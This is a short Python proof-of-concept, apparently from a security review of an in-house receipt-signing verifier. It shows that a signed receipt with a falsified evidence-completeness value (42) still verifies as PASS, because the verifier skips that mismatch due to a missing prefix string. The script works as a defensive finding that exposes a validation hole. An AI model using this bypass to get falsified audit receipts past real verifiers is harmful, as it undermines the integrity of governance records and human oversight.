#!/usr/bin/env python3
"""poc_alpha_15 — structural_fail prefix-matching hole: the reason
"declared completeness X != computed Y" starts with "declared", which is NOT
in the structural_fail prefix tuple. The mismatch is therefore advisory-only.

A receipt whose signed evidence block declares completeness: 42 (or any
nonsense/lie in the normative field) verifies PASS — the verifier recomputes
the value, notes the lie in `reasons`, and passes it anyway. The
structural_fail net was meant to catch every field-integrity violation; this
one class (the ONLY declared-vs-computed cross-check in the verifier) slips
through purely because of a prefix-string omission. That is the boundary
game: any future check whose reason string misses the tuple is silently
advisory.
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (build_receipt, generate_keypair, verify_receipt,
                         canonical, sha256_hex, sign, keyid, PREDICATE_TYPE)

SVC = {"type": "service", "id": "svc-deploy-bot", "is_service_account": True,
       "auth_method": "mtls"}
POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]

def resign(stmt, sk):
    stmt["subject"]["digest"]["sha256"] = sha256_hex(canonical(stmt["predicate"]))
    payload = canonical({k: v for k, v in stmt.items() if k != "signatures"})
    stmt["signatures"] = [{"keyid": keyid(sk.public_key()),
                           "sig": sign(sk, PREDICATE_TYPE, payload)}]
    return stmt

sk, pk = generate_keypair()
r = build_receipt(action_id="a-202", subject_name="prod:svc", actor=SVC,
                  policy_decision=POL,
                  execution={"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
                  evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk)

# Normative field carries garbage; signer re-signs (signer-adversary model).
r["predicate"]["evidence"]["completeness"] = 42
resign(r, sk)
v = verify_receipt(r, pk)
print(f"[*] declared completeness = 42; computed = {v.evidence_completeness}")
print(f"[*] verdict={v.verdict}  reasons={v.reasons}")

mismatch_noted = any("declared completeness" in x for x in v.reasons)
works = v.verdict == "PASS" and mismatch_noted
print("EXPLOIT-WORKS" if works else "HELD")
